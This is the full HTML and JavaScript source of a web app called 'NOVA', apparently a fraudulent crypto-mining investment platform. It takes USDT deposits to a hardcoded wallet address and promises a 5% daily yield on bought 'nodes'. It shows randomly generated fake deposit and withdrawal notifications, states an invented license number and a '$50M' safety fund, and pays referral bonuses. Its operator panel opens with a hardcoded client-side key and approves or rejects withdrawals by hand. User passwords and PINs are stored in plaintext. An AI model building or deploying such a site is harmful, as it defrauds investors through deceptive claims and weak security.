<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Global Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; --card: rgba(255,255,255,0.03); }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        /* UI Elements */
        .app-card { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; transition: 0.3s; position: relative; }
        .gold-glow { border: 1px solid rgba(212, 175, 55, 0.3); box-shadow: 0 0 20px rgba(212, 175, 55, 0.1); }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(8,8,8,0.98); backdrop-filter: blur(25px); border-top: 1px solid #151515; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #3d3d3d; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        .screen { display: none; padding-bottom: 120px; animation: fadeIn 0.4s ease forwards; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Modals & Inputs */
        .modal { display: none; position: fixed; inset: 0; background: black; z-index: 2000; padding: 25px; overflow-y: auto; }
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 18px; border-radius: 20px; color: white; font-size: 14px; outline: none; transition: 0.3s; }
        .nova-input:focus { border-color: var(--gold); }
        
        /* Notifications */
        #toast-container { position: fixed; top: 25px; left: 50%; transform: translateX(-50%); z-index: 9999; pointer-events: none; width: 90%; max-width: 350px; }
        .toast { background: rgba(15,15,15,0.95); border: 1px solid var(--gold); padding: 12px 20px; border-radius: 50px; color: white; font-size: 10px; font-weight: 800; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; animation: slideDown 0.5s ease, fadeOut 0.5s 4s forwards; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeOut { to { opacity: 0; transform: translateY(-20px); } }
    </style>
</head>
<body>

    <div id="toast-container"></div>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <h1 onclick="handleTaps()" class="text-6xl font-black mb-2 tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <p class="text-[8px] tracking-[5px] text-gray-600 uppercase mb-12 font-bold">Encrypted Asset Protocol</p>
        <div class="app-card p-8 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input mb-4">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input mb-4">
            <input type="text" id="adm-key" placeholder="System Override Key" class="hidden nova-input border-[#D4AF37] mb-6">
            <button onclick="auth()" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black text-xs tracking-widest">INITIALIZE SESSION</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-gray-500 uppercase font-bold cursor-pointer">Register New Identity</p>
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-gray-900 pb-4">
            <h2 class="text-[#D4AF37] font-black uppercase text-sm tracking-widest">Command Center</h2>
            <button onclick="location.reload()" class="text-red-500 font-black text-xs">DISCONNECT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-black/80 backdrop-blur-md z-50">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 app-card flex items-center justify-center text-[#D4AF37] font-black border-[#D4AF37]/20">N</div>
                <div>
                    <div class="flex items-center gap-1">
                        <p id="user-id-txt" class="text-xs font-black uppercase"></p>
                        <i class="fa-solid fa-circle-check text-blue-500 text-[10px]"></i>
                    </div>
                    <p id="vip-tag" class="text-[8px] text-gray-600 font-bold uppercase tracking-widest">VIP 1 Member</p>
                </div>
            </div>
            <i onclick="logout()" class="fa-solid fa-power-off text-gray-800 text-lg"></i>
        </header>

        <div id="dash-screen" class="screen active-screen p-6">
            <div class="app-card p-10 mb-8 gold-glow text-center">
                <p class="text-[9px] text-gray-500 font-black tracking-widest mb-3 uppercase">Net Liquidity</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter mb-4">$0.00</h1>
                <p id="v-daily" class="text-green-500 text-[10px] font-black">Daily Yield: +$0.00</p>
            </div>

            <div class="grid grid-cols-4 gap-2 mb-10 text-center">
                <div onclick="openModal('dep-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-green-500"><i class="fa-solid fa-plus"></i></div>
                    <span class="text-[8px] font-black text-gray-500 uppercase">Deposit</span>
                </div>
                <div onclick="openModal('wd-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-red-500"><i class="fa-solid fa-minus"></i></div>
                    <span class="text-[8px] font-black text-gray-500 uppercase">Withdraw</span>
                </div>
                <div onclick="openModal('legal-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-blue-500"><i class="fa-solid fa-shield-halved"></i></div>
                    <span class="text-[8px] font-black text-gray-500 uppercase">Legal</span>
                </div>
                <div onclick="openModal('faq-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-[#D4AF37]"><i class="fa-solid fa-circle-question"></i></div>
                    <span class="text-[8px] font-black text-gray-500 uppercase">FAQ</span>
                </div>
            </div>

            <h3 class="text-[10px] font-black text-gray-700 mb-5 tracking-widest uppercase">System Ledger</h3>
            <div id="hist-mini" class="space-y-3"></div>
        </div>

        <div id="mine-screen" class="screen p-6">
            <h2 class="text-2xl font-black mb-1 gold-text uppercase">Mining Farm</h2>
            <p class="text-[9px] text-gray-600 mb-8 uppercase tracking-widest">Active Quantum Staking</p>
            <div id="nodes-container" class="space-y-6"></div>
        </div>

        <div id="office-screen" class="screen p-6">
            <h2 class="text-2xl font-black mb-8 uppercase">Partner Hub</h2>
            <div class="app-card p-8 text-center mb-8">
                <i class="fa-solid fa-share-nodes text-[#D4AF37] text-2xl mb-4"></i>
                <p class="text-[10px] font-bold text-gray-500 mb-4 uppercase">Invitation Protocol</p>
                <div id="ref-link" class="bg-black/50 p-4 rounded-xl border border-white/5 text-[9px] font-mono text-gray-400 break-all select-all"></div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div class="app-card p-6 border-b-2 border-blue-500"><p class="text-[8px] text-gray-500 font-bold uppercase">Team Size</p><h3 class="text-xl font-black">0</h3></div>
                <div class="app-card p-6 border-b-2 border-green-500"><p class="text-[8px] text-gray-500 font-bold uppercase">Total Bonus</p><h3 class="text-xl font-black">$0.00</h3></div>
            </div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-terminal text-xl"></i><span>TERMINAL</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-xl"></i><span>MINING</span></div>
            <div onclick="nav('office-screen')" class="nav-item" id="nav-office"><i class="fa-solid fa-users-viewfinder text-xl"></i><span>OFFICE</span></div>
        </nav>
    </div>

    <div id="pin-modal" class="modal">
        <div onclick="closeModal('pin-modal')" class="mb-10 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-4 gold-text uppercase text-center">Setup PIN</h2>
        <p class="text-[10px] text-gray-600 mb-8 text-center uppercase tracking-widest font-bold">6-Digit Withdrawal Security Key</p>
        <input type="password" id="new-pin" maxlength="6" placeholder="000000" class="nova-input mb-8 text-center tracking-[15px] text-3xl font-black">
        <button onclick="setWithdrawPin()" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black tracking-widest">FINALIZE SECURITY</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-10 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 text-red-500 uppercase">Withdraw</h2>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="wd-addr" placeholder="Wallet Address" class="nova-input mb-8">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black py-5 rounded-2xl font-black">AUTHORIZE SEND</button>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-10 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 gold-text uppercase">Deposit</h2>
        <div class="app-card p-6 mb-6 border-dashed border-gray-800 text-center"><p class="text-[9px] text-gray-500 mb-2 uppercase font-black">Binance (BEP20) USDT</p><p class="text-xs font-black break-all text-gray-300">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p></div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="dep-tid" placeholder="Transaction TXID" class="nova-input mb-8">
        <button onclick="requestFin('Deposit')" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black">SUBMIT PROOF</button>
    </div>

    <div id="legal-modal" class="modal">
        <div onclick="closeModal('legal-modal')" class="mb-10 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-6 gold-text uppercase">Legal Identity</h2>
        <div class="app-card p-6 mb-8"><p class="text-xs font-black mb-2 uppercase">Licenced Fin-Entity</p><p class="text-[10px] text-gray-500 leading-relaxed">NOVA is a registered liquidity operator under MSB License #31000214859621. We comply with global AML and GDPR protocols.</p></div>
        <div class="app-card p-6 bg-green-500/5 border-green-500/20"><p class="text-[10px] font-black text-green-500 uppercase">Safety Assurance</p><p class="text-[9px] text-gray-400 mt-2">All deposits are backed by a $50M Tier-1 Liquidity Fund to protect against market fluctuations.</p></div>
    </div>

    <div id="faq-modal" class="modal">
        <div onclick="closeModal('faq-modal')" class="mb-10 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 blue-text uppercase">FAQ</h2>
        <div class="space-y-4">
            <div class="app-card p-5"><p class="text-[11px] font-black mb-2 uppercase">How to start mining?</p><p class="text-[10px] text-gray-500">Deposit USDT, select a Node Alpha in the farm, and click activate. Rewards accrue every 24 hours.</p></div>
            <div class="app-card p-5"><p class="text-[11px] font-black mb-2 uppercase">Withdrawal limits?</p><p class="text-[10px] text-gray-500">Minimum withdrawal is $10.00. Processing time is 2-24 hours depending on network congestion.</p></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        window.onload = () => {
            const saved = localStorage.getItem('nova_session');
            if(saved) start(saved);
            renderNodes();
            setInterval(showActivity, 15000);
        };

        // 🔔 GLOBAL ACTIVITY POP-UPS
        function showActivity() {
            const container = document.getElementById('toast-container');
            const msgs = ["User ID 48... just activated Alpha-10", "New $1,500 Deposit confirmed!", "Withdrawal of $45.00 successful", "ID 92... upgraded to VIP 3", "System: Security audit complete"];
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = `<i class="fa-solid fa-bolt text-[#D4AF37]"></i> ${msgs[Math.floor(Math.random()*msgs.length)]}`;
            container.appendChild(toast);
            setTimeout(() => toast.remove(), 4500);
        }

        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register New Identity" : "Back to Terminal"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return;

            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                if(s.exists()) return alert("Terminal ID Occupied");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, vip: 'VIP 1', time: Date.now() });
                localStorage.setItem('nova_session', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_session', id); start(id);
            } else alert("Access Denied");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-id-txt').innerText = id;
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Daily Yield: +$" + (d.data().daily || 0).toFixed(2);
                document.getElementById('vip-tag').innerText = d.data().vip || 'VIP 1 Member';
            });
            document.getElementById('ref-link').innerText = window.location.origin + "?ref=" + id;
            loadHistory();
        }

        function renderNodes() {
            const container = document.getElementById('nodes-container');
            container.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let price = i === 1 ? 15 : (i * 60) + (i > 10 ? i*400 : 0);
                if(i === 20) price = 15000;
                let yieldVal = (price * 0.05).toFixed(2);
                container.innerHTML += `
                    <div class="app-card overflow-hidden">
                        <img src="https://picsum.photos/400/200?random=${i}" class="w-full h-24 object-cover opacity-40">
                        <div class="p-6 flex justify-between items-center">
                            <div><p class="text-[9px] font-black text-gray-500 uppercase">Alpha Node ${i}</p><p class="text-xl font-black">$${price}</p></div>
                            <button onclick="buyNode(${price}, ${yieldVal}, 'VIP ${Math.ceil(i/4)}')" class="bg-white text-black px-6 py-3 rounded-xl text-[10px] font-black uppercase">Buy</button>
                        </div>
                    </div>`;
            }
        }

        window.buyNode = async (p, d, v) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(s.data().balance < p) return alert("Liquidity Low!");
            await updateDoc(uRef, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d, vip: v });
            alert("Machine Active!");
        };

        window.setWithdrawPin = async () => {
            const pin = document.getElementById('new-pin').value;
            if(pin.length !== 6) return alert("Must be 6 digits");
            await updateDoc(doc(db, "users", activeUser), { securePin: pin });
            alert("PIN Synchronized!"); closeModal('pin-modal');
        };

        window.requestFin = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            
            if(type === 'Withdrawal') {
                if(!s.data().securePin) return openModal('pin-modal');
                const pin = prompt("Enter 6-Digit PIN:");
                if(pin !== s.data().securePin) return alert("Invalid PIN");
                if(s.data().balance < amt || !amt) return alert("Balance Low");
                await updateDoc(uRef, { balance: s.data().balance - amt });
            }

            await addDoc(collection(db, "logs"), { 
                user: activeUser, amount: amt, type, status: 'Pending', 
                tid: document.getElementById('dep-tid')?.value || '', 
                addr: document.getElementById('wd-addr')?.value || '', 
                time: Date.now() 
            });
            alert("Sent to Ledger"); closeModal(type === 'Deposit' ? 'dep-modal' : 'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser)), s => {
                const list = document.getElementById('hist-mini'); list.innerHTML = "";
                let arr = []; s.forEach(d => arr.push(d.data()));
                arr.sort((a,b) => b.time - a.time).slice(0,3).forEach(t => {
                    list.innerHTML += `<div class="app-card p-4 flex justify-between items-center text-[9px] font-black uppercase">
                        <span class="${t.type=='Deposit'?'text-green-500':'text-red-500'}">${t.type}</span>
                        <span>$${t.amount}</span>
                        <span class="text-gray-600">${t.status}</span>
                    </div>`;
                });
            });
        }

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = `<div class="text-center text-[9px] text-gray-500 mb-4 font-black">ACTIVE REQUESTS: ${s.size}</div>`;
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="app-card p-5 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'} mb-4">
                        <div class="flex justify-between mb-2 text-[10px] font-black"><span>${r.user}</span><span>$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-500 mb-4 break-all">${r.type}: ${r.tid || r.addr}</p>
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-3 rounded-xl text-[9px] font-black">CONFIRM</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[9px] font-black">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => {
            if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Success' });
        };

        window.reject = async (id, u, a, t) => {
            if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Rejected' });
        };

        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
        window.logout = () => { localStorage.removeItem('nova_session'); location.reload(); };
    </script>
</body>
</html>
